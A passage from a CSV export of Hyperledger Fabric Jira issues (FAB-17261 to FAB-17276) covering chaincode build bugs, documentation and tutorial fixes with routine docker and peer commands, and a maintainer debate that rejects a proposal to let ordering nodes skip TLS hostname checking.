See FAB-13196 for details.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-13196,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016cr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NodeJS chaincode build does not use network config passed in peer's config,FAB-17261,43718,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mrshah-ibm,mrshah-ibm,mrshah-ibm,14/Dec/19 1:25 AM,14/Feb/20 6:05 AM,28/Oct/23 3:09 AM,14/Feb/20 6:05 AM,v1.4.4,,,,,,,,,v1.4.5,,,,fabric-peer,,,,,,,,,0,,,,,,"The change in [FAB-15666|https://jira.hyperledger.org/browse/FAB-15666] was not enough for nodejs chaincode builds to pick up network config passed in the peer.

 

HostConfig and NetworkConfig will have to be passed in [this call][[https://github.com/hyperledger/fabric/blob/release-1.4/core/chaincode/platforms/util/utils.go#L174-L182]] as that is the container that builds the nodejs chaincode.",,denyeart,mrshah-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016df:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,mrshah-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Feb/20 6:05 AM;denyeart;https://github.com/hyperledger/fabric/pull/417 merged in release-1.4.
No need to cherry pick to future releases since the new chaincode builder is recommended in v2.0.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix document for instructions in build_network,FAB-17262,43719,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,14/Dec/19 3:01 AM,03/Jan/20 1:14 PM,28/Oct/23 3:09 AM,03/Jan/20 1:14 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"We need to fix the following manual instructions in described in *docs/source/build_network.rst*.

1.
 Commands to start network with docker-compose should also use *docker-compose-etcdraft2.yaml*, 
 because other operations assume to use *SampleMultiNodeEtcdRaft* profile.

The target parts are following:
{noformat}
docker-compose -f docker-compose-cli.yaml up -d
{noformat}
{noformat}
docker-compose -f docker-compose-cli.yaml -f docker-compose-couch.yaml up -d
{noformat}
 

2.
{noformat}
peer lifecycle chaincode package mycc.tar.gz --path /opt/gopath/src/github.com/hyperledger/fabric-samples/chaincode/abstore/node/ --lang node --label mycc_1
{noformat}
Because the directory name has been changed from 'node' to 'javascript', it should be:
{noformat}
peer lifecycle chaincode package mycc.tar.gz --path /opt/gopath/src/github.com/hyperledger/fabric-samples/chaincode/abstore/javascript/ --lang node --label mycc_1
{noformat}
 

3. 
 Before packaging Go chaincode like below, vendoring Go dependencies is required.
{noformat}
peer lifecycle chaincode package mycc.tar.gz --path github.com/hyperledger/fabric-samples/chaincode/abstore/go/ --lang golang --label mycc_1
{noformat}
{noformat}
peer lifecycle chaincode package marbles.tar.gz --path github.com/hyperledger/fabric-samples/chaincode/marbles02/go/ --lang golang --label marbles_1
{noformat}
So, a vendering operation like below should be added before their packaging operations.
{noformat}
GO111MODULE=on go mod vendor
{noformat}",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016dn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update peer docker commands in upgrade docs,FAB-17263,43720,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,14/Dec/19 3:10 AM,09/Jan/20 4:48 AM,28/Oct/23 3:09 AM,09/Jan/20 4:48 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"Update peer docker commands in upgrade docs to:


{code:java}
docker run -d -v /opt/backup/$PEER_CONTAINER/:/var/hyperledger/production/ \
            -v /opt/msp/:/etc/hyperledger/fabric/msp/ \
            --env-file ./env<name of node>.list \
            --name $PEER_CONTAINER \
            hyperledger/fabric-peer peer node start
{code}


in https://github.com/hyperledger/fabric/blob/master/docs/source/upgrade_to_newest_version.md and https://github.com/hyperledger/fabric/blob/master/docs/source/upgrading_your_components.md",,joe-alewine,pandrejko,suryalnvs,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016dv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),joe-alewine,pandrejko,suryalnvs,sykesm,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Jan/20 6:50 AM;pandrejko;[~joe-alewine]FYI;;;","07/Jan/20 10:52 PM;joe-alewine;[~suryalnvs]

The original command: docker run -d -v /opt/backup/$PEER_CONTAINER/:/var/hyperledger/production/ --name $PEER_CONTAINER hyperledger/fabric-peer:2.0 peer node start

Specified an image tag. We don't want to do that anymore?;;;","08/Jan/20 1:00 AM;sykesm;https://github.com/hyperledger/fabric/pull/418;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update chaincode languge mode in network.sh and addOrg3.sh,FAB-17264,43721,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,rameshthoomu,rameshthoomu,14/Dec/19 4:18 AM,17/Jan/20 7:05 AM,28/Oct/23 3:09 AM,17/Jan/20 7:05 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,"Update chaincode language mode in network.sh and addOrg3.sh. Observed ""*javascript*"" has to pass for the node chaincode but I still see *node* in the help function in both network.sh and addOrg3.sh scripts.",,negupta,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016e3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Dec/19 12:22 AM;negupta;Addressed with https://github.com/hyperledger/fabric-samples/pull/91;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move private data tutorial to use test network,FAB-17265,43722,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,14/Dec/19 4:28 AM,20/Jan/20 1:31 PM,28/Oct/23 3:09 AM,20/Jan/20 1:31 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i016eb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Jan/20 7:30 AM;negupta;https://github.com/hyperledger/fabric/pull/457;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move CouchDB tutorial to test network,FAB-17266,43723,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,14/Dec/19 4:29 AM,17/Jan/20 7:04 AM,28/Oct/23 3:09 AM,17/Jan/20 7:04 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i016ej:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move add an org to a channel tutorial to test network,FAB-17267,43724,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,14/Dec/19 4:30 AM,04/Feb/20 2:15 AM,28/Oct/23 3:09 AM,04/Feb/20 1:30 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i016er:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move fabcar sample to test network,FAB-17268,43725,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,14/Dec/19 4:33 AM,31/Mar/20 3:39 AM,28/Oct/23 3:09 AM,31/Mar/20 3:39 AM,v2.0.0,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,,,anhngo,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i016ez:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),anhngo,negupta,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
create new deploy a chaincode on a channel tutorial,FAB-17269,43726,44479,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,14/Dec/19 4:34 AM,10/Mar/20 1:26 AM,28/Oct/23 3:09 AM,07/Mar/20 12:25 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,Currently written in BYFN,,negupta,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016f7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,pandrejko,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Jan/20 7:49 AM;pandrejko;Request from Matthew White that we  new Smart contract Programming model is mentioned in the new tutorial

His java smart contract quick start tutorial is here: https://github.com/hyperledger/fabric/pull/371

There is other information in there that we might want to leverage as well around logspout and debugging.;;;","07/Mar/20 12:25 AM;pandrejko;PR. https://github.com/hyperledger/fabric/pull/666;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Write new create a channel tutorial,FAB-17270,43727,44479,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,14/Dec/19 4:35 AM,19/Jun/20 12:24 AM,28/Oct/23 3:09 AM,19/Jun/20 12:22 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,Some commands are currently in BYFN,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016ff:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create new using the Fabric CA tutorial,FAB-17271,43728,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,negupta,negupta,negupta,14/Dec/19 4:36 AM,01/Apr/20 4:09 AM,28/Oct/23 3:09 AM,01/Apr/20 4:09 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11240,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016fn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve Docker Builds by Limiting Build Context Scope,FAB-17272,43730,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,16/Dec/19 3:16 AM,17/Dec/19 2:15 AM,28/Oct/23 3:09 AM,17/Dec/19 2:15 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,Docker builds take several minutes per run just forming the context. This is because we send pretty much the entire fabric directory into the build. We should explicitly extend the .dockerignore file to exclude everything we can and modify the build make target to only include the context necessary.,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016g3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update to latest fabric-protos-go and fabric-sdk-go,FAB-17273,43731,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bstasyszyn,bstasyszyn,bstasyszyn,16/Dec/19 5:00 AM,16/Dec/19 7:24 AM,28/Oct/23 3:09 AM,16/Dec/19 7:24 AM,,,,,,,,,,,,,,fabric-cli,,,,,,,,,0,,,,,,Point to the latest fabric-sdk-go and fabric-protos-go.,,bstasyszyn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016gb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bstasyszyn,,,,,,,,,,,,,,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Update system test network spec input files with ""cacheSize"" parameter for couchdb caching",FAB-17274,43740,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,rameshthoomu,rameshthoomu,17/Dec/19 7:08 AM,11/Jan/21 2:31 AM,28/Oct/23 3:09 AM,11/Jan/21 2:31 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Update system test network spec input files with ""cacheSize"" parameter for couchdb caching. See this for more information https://hyperledger-fabric.readthedocs.io/en/master/whatsnew.html#state-database-cache-for-improved-performance-on-couchdb

Below are the files needs to be updated.

[https://github.com/hyperledger/fabric-test/blob/master/tools/operator/templates/k8s/fabric-k8s-pods.yaml]

[https://github.com/hyperledger/fabric-test/blob/master/tools/operator/templates/docker/docker-compose.yaml]

[https://github.com/hyperledger/fabric-test/tree/master/tools/operator/testdata]",,btl5037,rameshthoomu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb8s",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,rameshthoomu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jan/20 5:06 AM;scottz;This is one piece of a 2.0 feature. Many perf tests could be constructed around this. Bigger workitem.

Should discuss with release manager to get test requirements.;;;","11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow OSN to skip hostname checking in tlscert,FAB-17275,43742,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,baohua,baohua,baohua,17/Dec/19 10:31 AM,26/Nov/20 9:47 AM,28/Oct/23 3:09 AM,26/Nov/20 9:47 AM,v1.4.3,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"Currently, OSN enabled TLS authentication for the raft communications.

In cases that OSN stays behind firewall/proxy/NATed devices, the published endpoint might not match that in the TLS cert. And the user may not care about it because there's following validation logics to compare the tls cert with those inside the channel config.

Hence we should expose the option to allow skip the hostname checking in the configuration.

With this option enabled, the OSN still requires to leverage the cert matching logic that is hardcoded to compare with the certs inside the channel config.",,baohua,mastersingh24,tangross,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016ib:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),baohua,mastersingh24,tangross,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Dec/19 5:47 PM;mastersingh24;I intentionally did not add the ability to set this property as I do not believe that we should permit insecure settings.;;;","21/Dec/19 3:25 AM;baohua;[~mastersingh24], actually, the OSN will check to match the tlscert with those stored inside the channel config. Hence even with this option enabled, the communication is still safe.

Besides, this is useful when the OSN stays behind network middle box or doing tests.;;;","23/Dec/19 4:04 AM;yacovm;{quote}Besides, this is useful when the OSN stays behind network middle box or doing tests.{quote}

* I don't see why this isn't useful when doing tests. We have already a trillion integration test cases for Raft and we never needed anything like that.
* If the network middlebox is on the site of the remote OSN then the certificate should just match the endpoint exposed by the middlebox, or alternatively there could be a DNS entry that routes the host that appears on the TLS certificate to the middlebox. 

I agree with [~mastersingh24] and I am still not convinced there is a need for this, as this can be solved in other ways ;;;","24/Dec/19 6:50 AM;baohua;[~yacovm], how about the cases that the network middle-box like Load balancer, needs to handle various back services, and does not have the corresponding TLS for each OSN? This is very usual with load balancer topology, especially with dynamic mode.;;;","24/Dec/19 7:33 AM;yacovm;Why would you configure the Raft endpoint in the channel config to be the address of the load balancer ? You use a load balancer to distribute connections from different clients, but in Raft there is a single connection between the leader and the followers. 

If you put more than a single node behind a LB then the rest of the nodes won't work at all because the leader won't connect to them.
If you put only a single node, then there is no point in having a LB right? 

Of course, you can put a firewall that doesn't terminate TLS and then you should just configure the endpoint in the channel config to be the firewall's address ;;;","24/Dec/19 10:13 AM;baohua;The situation is that the Load balancer can be shared by multiple OSNs, while each has a different public port (like a proxy), and *the OSN does not have the certificate matching that public address*.

Besides, the load balancer is in transparent mode, i.e., without TLS termination.

This situation did happen in some real case.;;;","24/Dec/19 5:39 PM;yacovm;I see, so you mean a port forwarding via a NAT, not a load balancer. Well, I think that this can be easily solved with customizing the DNS environment of the OSNs to route to the right address based on the host that appears on the certificate.

And still - you can just issue the certificate with a proper SAN. 
We have TLS CAs in Fabric, so we should put them in use instead of changing the code of Fabric to adjust to all possible network typologies. ;;;","25/Dec/19 4:41 AM;baohua;[~yacovm],

1. The (public) addresses must be those on the network device, which will be used by each OSN. OSN should connect with each other using the public addresses (across different datacenters);

2. Using SAN can work only when the OSN can define that certificate manually. But from a real case we found, that sometimes, the OSN cannot have that certificate with correct SAN (and CN).;;;","25/Dec/19 5:44 AM;yacovm;# So redirect the DNS hostnames of the OSNs behind that network device to the network device by altering the DNS configuration of where these OSNs are running. 
# Do you mind elaborating on this use case? Why is it not possible? Did the network admins lose all the private keys and are locked outside of the Fabric installation?;;;","25/Dec/19 8:33 AM;baohua;# No, we will not use the DNS hostnames behind the network device, as i mentioned, consider the case to allow crossing datacenters, we should use the public DNS name, which is on the network device.
 # Yes, this is common when the OSN and the network devices are controlled by different vendors. One is the blockchain vendor, and the other one is the network vendor. And this issue is to resolve such scenario. When we are not able to issue the tls cert as wished, cannot find solutions  other than allowing to ignore the hostname checking. But this is OK from security perspective, because the OSN will still check the content of the tlscert, to match those inside the channel config.;;;","25/Dec/19 5:04 PM;yacovm;# Why not make the DNS of the OSNs point to the network device when queried for the hostnames of the OSNs behind the network device? 
# The Blockchain vendor can then issue a TLS cert properly with the SAN of the network device, it doesn't need the network vendor :) ;;;","27/Dec/19 9:25 AM;baohua;# Exactly, that's what I mean, we should use the public address that binds on the network device for every OSN;
 # The problem is that the network vendor owns the network device and the certs, and cannot issue a corresponding TLS cert for each OSN behind. While the Blockchain vendor cannot simply use self-generated TLS cert with the SAN of the network device, and it does not have access to the root key of the public domain. I understand sometimes this situation won't happen, but once it happens, I cannot see other solutions. Thanks!;;;","27/Dec/19 10:43 PM;yacovm;# Let's assume the address of the network device is *1.2.3.4* and the address of an OSN that is behind it, is *10.0.0.1* and it is called *orderer1.org1.acme.org* and its TLS certificate has a DNS SAN with *orderer1.org1.acme.org* in it. 
If the network device routes based on port *7051* to *10.0.0.1* that is behind it, then you can just make the DNS of the other orderers to point to *1.2.3.4* whenever they query for *orderer.org1.acme.org* and then the TLS handshake will work without any special Fabric configurations.
# You can issue a self signed TLS CA certification chain yourself, you just need to have the admin private key for the Blockchain organization to add it to the config. You don't need any public domain key or anything. ;;;","28/Dec/19 3:36 AM;baohua;# Yes, that's the case;
 # Well, I also thought about this workaround, but using self-signed cert is not acceptable in this product env. Seems either we can have the network vendor issued some cert, or we have to skip the hostname validation?;;;","28/Dec/19 3:41 AM;yacovm;# So you see that if you follow my instructions, you don't need to use *InsecureSkipVerify*, it will work even without as long as you configure DNS properly.
# goto (1);;;","28/Dec/19 7:05 AM;baohua;I think we are having different assumptions here.

The original requirement is that we cannot use self-signed cert, and that's the problem to resolve.

IMHO, DNS is not the problem, do not know why that will matter this cert issue.

Let me clarify it with a summary:

1) The OSN must use the public address that the middlebox (network device) will manage;

2) The OSN cannot get a correct tls cert that matches the public address (in CN or SAN fields);

3) No self-signed cert is allowed, otherwise, 2) will be no problem.

With these three requirements, cannot see any other options.;;;","28/Dec/19 8:42 PM;yacovm;So you can just use hostnames for the OSNs and configure the DNS to map all hostnames of the OSNs to the IP address of the network device. 
In the channel config, the hostnames of the OSNs should appear, and not the IP address of the network device. 

It should work as is, without Fabric modifications. ;;;","29/Dec/19 3:00 AM;baohua;Again, there is no problem with the DNS-host mapping, the issue is that there is no correct tls cert (with matched CN or SAN) for the OSN.

How can this work without enabling the tls skip-hostname-checking option?;;;","29/Dec/19 4:05 AM;yacovm;I [explained|https://jira.hyperledger.org/browse/FAB-17275?focusedCommentId=66419&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-66419] a few comments above:
{quote}
Let's assume the address of the network device is *1.2.3.4* and the address of an OSN that is behind it, is *10.0.0.1* and it is called *orderer1.org1.acme.org* and its TLS certificate has a DNS SAN with *orderer1.org1.acme.org* in it.
If the network device routes based on port *7051* to *10.0.0.1* that is behind it, then you can just make the DNS of the other orderers to point to *1.2.3.4 *whenever they query for *orderer.org1.acme.org* and then the TLS handshake will work without any special Fabric configurations.
{quote};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix wrong protobuf import in mgr_test.go,FAB-17276,43743,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jacklightChen,jacklightChen,jacklightChen,17/Dec/19 1:56 PM,18/Dec/19 9:02 AM,28/Oct/23 3:09 AM,18/Dec/19 9:02 AM,,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,,,,,,"In ""core/ledger/confighistory/mgr.go"" ,the import is golang protobuf 

In ""core/ledger/confighistory/mgr_test.go"",the import is gogo protobuf  

